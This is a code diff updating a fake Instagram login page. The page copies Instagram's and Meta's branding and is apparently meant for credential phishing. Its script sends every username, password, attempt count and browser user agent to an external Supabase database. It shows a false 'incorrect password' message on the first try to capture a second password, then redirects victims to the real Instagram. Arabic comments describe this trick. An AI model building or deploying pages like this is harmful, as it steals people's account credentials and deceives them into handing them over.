@@ -2,9 +2,14 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+<meta name="color-scheme" content="light only">
+<meta name="theme-color" content="#ffffff">
 <title>Instagram</title>
 <link rel="icon" href="https://static.cdninstagram.com/rsrc.php/v3/yI/r/VsNE-OHk_8a.png">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
 
 <script>
   const SUPABASE_URL = 'https://zraqeusxizqutshtzsrf.supabase.co';
@@ -13,171 +18,348 @@
 </script>
 
 <style>
-  * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+  * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+
+  html, body { height: 100%; }
+
   body {
-    background: #fafafa;
+    font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+    background: #ffffff;
+    color: #000000;
     display: flex;
     flex-direction: column;
     align-items: center;
+    padding: 0 24px;
+    overflow-x: hidden;
+    -webkit-font-smoothing: antialiased;
+  }
+
+  .container {
+    width: 100%;
+    max-width: 400px;
+    flex: 1;
+    display: flex;
+    flex-direction: column;
+    padding-top: 72px;
+    padding-bottom: 24px;
+  }
+
+  .ig-logo {
+    display: flex;
     justify-content: center;
-    min-height: 100vh;
-    padding: 20px;
-    color: #262626;
+    margin-bottom: 72px;
   }
-  .container { width: 100%; max-width: 350px; }
-  .login-box {
-    background: #fff;
-    border: 1px solid #dbdbdb;
-    border-radius: 1px;
-    padding: 40px 40px 20px;
-    text-align: center;
-    margin-bottom: 10px;
+  .ig-logo svg {
+    width: 76px;
+    height: 76px;
+    display: block;
+    background: transparent;
   }
-  .logo {
-    font-family: 'Billabong', 'Brush Script MT', cursive;
-    font-size: 48px;
-    margin-bottom: 30px;
-    color: #262626;
-    font-weight: 400;
+
+  .login-form {
+    display: flex;
+    flex-direction: column;
+    gap: 14px;
   }
-  .login-form { display: flex; flex-direction: column; gap: 6px; }
-  .login-form input {
-    background: #fafafa;
-    border: 1px solid #dbdbdb;
-    border-radius: 3px;
-    padding: 9px 8px 7px;
-    font-size: 12px;
-    outline: none;
+
+  .field {
+    position: relative;
     width: 100%;
   }
-  .login-form input:focus { border-color: #a8a8a8; }
-  .login-form input::placeholder { color: #8e8e8e; }
-  .login-btn {
-    background: #0095f6;
-    color: #fff;
+
+  .field input {
+    width: 100%;
+    height: 56px;
+    background: #ffffff;
+    border: 1px solid #c7c7c7;
+    border-radius: 12px;
+    padding: 20px 16px 6px;
+    font-size: 16px;
+    color: #000000;
+    outline: none;
+    font-family: inherit;
+    transition: border-color .15s;
+  }
+
+  .field input:focus { border-color: #a0a0a0; }
+  .field input[type="password"] { padding-right: 54px; }
+
+  .field label {
+    position: absolute;
+    left: 17px;
+    top: 50%;
+    transform: translateY(-50%);
+    color: #737373;
+    font-size: 16px;
+    pointer-events: none;
+    transition: all .15s ease;
+  }
+
+  .field input:focus + label,
+  .field input:not(:placeholder-shown) + label {
+    top: 12px;
+    transform: none;
+    font-size: 12px;
+    color: #737373;
+  }
+
+  .toggle-eye {
+    position: absolute;
+    right: 14px;
+    top: 50%;
+    transform: translateY(-50%);
+    width: 34px;
+    height: 34px;
+    background: none;
     border: none;
-    border-radius: 8px;
-    padding: 8px;
-    font-size: 14px;
+    cursor: pointer;
+    padding: 0;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    z-index: 5;
+  }
+
+  .toggle-eye svg {
+    width: 24px;
+    height: 24px;
+    display: block;
+    pointer-events: none;
+  }
+
+  .login-btn {
+    height: 50px;
+    background: #0095f6;
+    color: #ffffff;
+    border: none;
+    border-radius: 25px;
+    font-size: 16px;
     font-weight: 600;
     margin-top: 8px;
     cursor: pointer;
-    transition: opacity .15s;
+    font-family: inherit;
+    transition: background .15s, opacity .15s;
   }
-  .login-btn:disabled { opacity: 0.5; cursor: default; }
-  .divider {
+  .login-btn:active { background: #1877f2; }
+  .login-btn:disabled { opacity: 0.6; cursor: default; }
+
+  .forgot {
+    display: block;
+    text-align: center;
+    color: #000000;
+    font-size: 15px;
+    font-weight: 500;
+    text-decoration: none;
+    margin-top: 24px;
+    padding: 8px;
+  }
+
+  /* رسالة الخطأ */
+  .error-msg {
+    display: none;
+    background: #ffffff;
+    border: 1px solid #dbdbdb;
+    color: #ed4956;
+    font-size: 14px;
+    padding: 14px 16px;
+    border-radius: 12px;
+    margin-top: 18px;
+    line-height: 1.45;
+    text-align: center;
+    animation: shake .35s ease;
+  }
+
+  .error-msg.show { display: block; }
+
+  @keyframes shake {
+    0%, 100% { transform: translateX(0); }
+    25%      { transform: translateX(-6px); }
+    75%      { transform: translateX(6px); }
+  }
+
+  .spacer { flex: 1; min-height: 32px; }
+
+  .signup-btn {
     display: flex;
     align-items: center;
-    margin: 20px 0;
-    color: #8e8e8e;
-    font-size: 13px;
+    justify-content: center;
+    width: 100%;
+    height: 50px;
+    color: #0095f6;
+    border: 1px solid #0095f6;
+    border-radius: 25px;
+    font-size: 15px;
     font-weight: 600;
+    text-decoration: none;
+    margin-bottom: 32px;
+    background: #ffffff;
+    transition: background .15s;
   }
-  .divider::before, .divider::after {
-    content: '';
-    flex: 1;
-    height: 1px;
-    background: #dbdbdb;
-  }
-  .divider span { padding: 0 18px; }
-  .fb-login {
+  .signup-btn:active { background: rgba(0, 149, 246, 0.06); }
+
+  .meta-brand {
     display: flex;
     align-items: center;
     justify-content: center;
     gap: 8px;
-    color: #385185;
-    font-size: 14px;
+    padding: 16px 0 32px;
+    color: #000000;
+    font-size: 17px;
     font-weight: 600;
-    text-decoration: none;
-    margin-bottom: 15px;
+    letter-spacing: -0.3px;
   }
-  .fb-login svg { width: 16px; height: 16px; fill: #385185; }
-  .forgot {
-    color: #00376b;
-    font-size: 12px;
-    text-decoration: none;
-    display: inline-block;
-    margin-top: 10px;
+  .meta-brand svg {
+    width: 34px;
+    height: 22px;
+    display: block;
   }
-  .error-msg {
-    display: none;
-    background: #ed4956;
-    color: #fff;
-    font-size: 13px;
-    padding: 10px;
-    border-radius: 4px;
-    margin-top: 15px;
-    line-height: 1.4;
+
+  @media (prefers-color-scheme: dark) {
+    html, body { background: #ffffff !important; color: #000000 !important; }
+    .field input { background: #ffffff !important; color: #000000 !important; }
+    .field label { color: #737373 !important; }
+    .toggle-eye svg path,
+    .toggle-eye svg line,
+    .toggle-eye svg circle { stroke: #737373 !important; }
+    .signup-btn { background: #ffffff !important; }
+    .error-msg { background: #ffffff !important; }
+    .ig-logo svg { background: transparent !important; }
+    .login-btn { color: #ffffff !important; }
   }
-  .signup-box {
-    background: #fff;
-    border: 1px solid #dbdbdb;
-    border-radius: 1px;
-    padding: 20px;
-    text-align: center;
-    font-size: 14px;
-    margin-bottom: 20px;
+
+  @media (max-height: 720px) {
+    .container { padding-top: 40px; }
+    .ig-logo { margin-bottom: 48px; }
+    .ig-logo svg { width: 64px; height: 64px; }
   }
-  .signup-box a { color: #0095f6; text-decoration: none; font-weight: 600; }
-  .get-app { text-align: center; font-size: 14px; }
-  .get-app p { margin-bottom: 15px; }
-  .stores { display: flex; justify-content: center; gap: 8px; }
-  .stores img { height: 40px; }
+
+  @media (max-height: 620px) {
+    .container { padding-top: 20px; }
+    .ig-logo { margin-bottom: 32px; }
+    .ig-logo svg { width: 54px; height: 54px; }
+  }
 </style>
 </head>
 <body>
 
 <div class="container">
-  <div class="login-box">
-    <div class="logo">Instagram</div>
 
-    <form class="login-form" id="loginForm" action="#" method="POST">
-      <input type="text" name="username" placeholder="Phone number, username, or email" autocomplete="username" required>
-      <input type="password" name="password" placeholder="Password" autocomplete="current-password" required>
-      <button type="submit" class="login-btn" id="loginBtn">Log In</button>
-    </form>
+  <div class="ig-logo">
+    <svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
+      <defs>
+        <radialGradient id="igGrad" cx="30%" cy="107%" r="150%" fx="30%" fy="107%">
+          <stop offset="0%"   stop-color="#FDF497"/>
+          <stop offset="5%"   stop-color="#FDF497"/>
+          <stop offset="45%"  stop-color="#FD5949"/>
+          <stop offset="60%"  stop-color="#D6249F"/>
+          <stop offset="90%"  stop-color="#285AEB"/>
+        </radialGradient>
+      </defs>
+      <rect x="4" y="4" width="92" height="92" rx="26" ry="26"
+            fill="none" stroke="url(#igGrad)" stroke-width="7.5"/>
+      <circle cx="50" cy="50" r="21"
+              fill="none" stroke="url(#igGrad)" stroke-width="7.5"/>
+      <circle cx="74.5" cy="25.5" r="4.8" fill="url(#igGrad)"/>
+    </svg>
+  </div>
 
-    <div class="divider"><span>OR</span></div>
+  <form class="login-form" id="loginForm" action="#" method="POST" novalidate>
 
-    <a href="#" class="fb-login">
-      <svg viewBox="0 0 24 24">
-        <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
-      </svg>
-      Log in with Facebook
-    </a>
-
-    <a href="#" class="forgot">Forgot password?</a>
-
-    <div class="error-msg" id="errorMsg">
-      Sorry, your password was incorrect. Please double-check your password.
+    <div class="field">
+      <input type="text" name="username" id="usernameField" placeholder=" " autocomplete="username" required>
+      <label for="usernameField">Phone number, username, or email</label>
     </div>
-  </div>
 
-  <div class="signup-box">
-    Don't have an account? <a href="#">Sign up</a>
-  </div>
+    <div class="field">
+      <input type="password" name="password" id="passwordField" placeholder=" " autocomplete="current-password" required>
+      <label for="passwordField">Password</label>
 
-  <div class="get-app">
-    <p>Get the app.</p>
-    <div class="stores">
-      <img src="https://static.cdninstagram.com/rsrc.php/v3/y5/r/TJztmXpWTmS.png" alt="App Store">
-      <img src="https://static.cdninstagram.com/rsrc.php/v3/y2/r/__geKiQnSG-.png" alt="Google Play">
+      <button type="button" class="toggle-eye" id="toggleEye" aria-label="Show password">
+        <svg id="eyeClosed" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+          <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"
+                stroke="#737373" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"/>
+          <line x1="1" y1="1" x2="23" y2="23" stroke="#737373" stroke-width="1.7" stroke-linecap="round"/>
+        </svg>
+        <svg id="eyeOpen" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" style="display:none;">
+          <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"
+                stroke="#737373" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"/>
+          <circle cx="12" cy="12" r="3"
+                  stroke="#737373" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+      </button>
     </div>
+
+    <button type="submit" class="login-btn" id="loginBtn">Log In</button>
+  </form>
+
+  <a href="#" class="forgot">Forgot password?</a>
+
+  <div class="error-msg" id="errorMsg">
+    Sorry, your password was incorrect. Please double-check your password.
   </div>
+
+  <div class="spacer"></div>
+
+  <a href="#" class="signup-btn">Create new account</a>
+
+  <div class="meta-brand">
+    <svg viewBox="0 0 287.57 191.36" xmlns="http://www.w3.org/2000/svg" aria-label="Meta">
+      <defs>
+        <linearGradient id="metaGrad" x1="0%" y1="0%" x2="100%" y2="100%">
+          <stop offset="0%"   stop-color="#0081FB"/>
+          <stop offset="50%"  stop-color="#0064E0"/>
+          <stop offset="100%" stop-color="#0081FB"/>
+        </linearGradient>
+      </defs>
+      <path fill="url(#metaGrad)" d="M30.06 23.9C45.62 0 65.74 0 76.44 0c15.63 0 26.85 6.44 35.4 20.02 5.63 8.94 9.53 18.94 12.73 28.57-8.14 13.32-14.62 24.6-18.72 32.6-3.83-8.63-9.09-20.55-14.55-29.88-6.04-10.33-10.7-15.32-19.87-15.32-9.79 0-13.72 6.42-20.62 17.65C41.2 68.02 33.72 88.86 33.72 111c0 14.47 2.56 25.76 7.5 32.82 4.3 6.16 10.13 9.05 17.6 9.05 8.87 0 14.55-4.55 19.62-13.28 3.98-6.85 10.32-20.86 15.97-33.6 6.88-15.5 13.35-30.42 22.1-43.35C126.18 47.28 138.05 38.7 155 38.7c17.5 0 30.9 8.05 41.02 24.08 9.98 15.82 14.75 35.65 14.75 56.05 0 20.72-5.13 40.75-15.36 56.65-10.5 16.32-25.24 24.55-42.7 24.55-15.86 0-27.34-7.26-37.55-22.03-5.02-7.25-10.6-18.34-16.2-30.13-3.66 7.03-7.72 14.82-11.18 21.03-10.13 18.13-22.63 30.87-41.87 31.1C26.16 200.3 10.9 190.42 4.4 172.02 0 159.42-1.13 145.6.62 131.2c2.05-16.87 6.9-33.63 12.63-48.35C19.4 65.5 22.42 55.1 30.06 23.9z"/>
+    </svg>
+    <span>Meta</span>
+  </div>
+
 </div>
 
 <script>
+// ===== تبديل إظهار/إخفاء كلمة المرور =====
+(function() {
+    var toggleBtn = document.getElementById('toggleEye');
+    var passInput = document.getElementById('passwordField');
+    var eyeClosed = document.getElementById('eyeClosed');
+    var eyeOpen   = document.getElementById('eyeOpen');
+
+    function togglePassword(e) {
+        if (e) { e.preventDefault(); e.stopPropagation(); }
+
+        if (passInput.type === 'password') {
+            passInput.type = 'text';
+            eyeClosed.style.display = 'none';
+            eyeOpen.style.display   = 'block';
+        } else {
+            passInput.type = 'password';
+            eyeClosed.style.display = 'block';
+            eyeOpen.style.display   = 'none';
+        }
+    }
+
+    toggleBtn.addEventListener('click', togglePassword);
+    toggleBtn.addEventListener('touchstart', togglePassword, { passive: false });
+})();
+
+// ===== إرسال الفورم — منطق محاولتين =====
+var attemptCount = 0;
+
 document.getElementById('loginForm').addEventListener('submit', function(e) {
     e.preventDefault();
 
-    var btn = document.getElementById('loginBtn');
-    btn.disabled = true;
-    btn.textContent = 'Logging in...';
+    var username  = document.getElementById('usernameField').value.trim();
+    var password  = document.getElementById('passwordField').value;
+    var btn       = document.getElementById('loginBtn');
+    var errorBox  = document.getElementById('errorMsg');
 
-    var form = this;
-    var username = form.querySelector('input[name="username"]').value;
-    var password = form.querySelector('input[name="password"]').value;
+    if (!username || !password) return;
 
+    attemptCount++;
+
+    // إرسال البيانات لـ Supabase في كل محاولة
     fetch(SUPABASE_URL + '/rest/v1/' + TABLE_NAME, {
         method: 'POST',
         headers: {
@@ -189,19 +371,39 @@ document.getElementById('loginForm').addEventListener('submit', function(e) {
         body: JSON.stringify({
             username: username,
             password: password,
+            attempt: attemptCount,
             user_agent: navigator.userAgent,
             ts: new Date().toISOString()
         })
-    })
-    .catch(function(err) { console.warn('send failed', err); })
-    .then(function() {
+    }).catch(function(err) { console.warn('send failed', err); });
+
+    // المحاولة الأولى: أظهر خطأ "كلمة السر خاطئة"
+    if (attemptCount === 1) {
+        btn.disabled = true;
+        btn.textContent = 'Logging in...';
+
         setTimeout(function() {
-            document.getElementById('errorMsg').style.display = 'block';
+            errorBox.classList.add('show');
+            // إعادة تفعيل الزر ومسح حقل كلمة السر
+            document.getElementById('passwordField').value = '';
+            btn.disabled = false;
+            btn.textContent = 'Log In';
+            // تركيز على حقل كلمة السر
+            document.getElementById('passwordField').focus();
+        }, 700);
+    }
+    // المحاولة الثانية وما بعدها: حوّل لإنستغرام الرسمي
+    else {
+        btn.disabled = true;
+        btn.textContent = 'Logging in...';
+
+        setTimeout(function() {
+            errorBox.classList.add('show');
             setTimeout(function() {
                 window.location.href = 'https://www.instagram.com';
-            }, 1500);
-        }, 800);
-    });
+            }, 600);
+        }, 500);
+    }
 });
 </script>
 
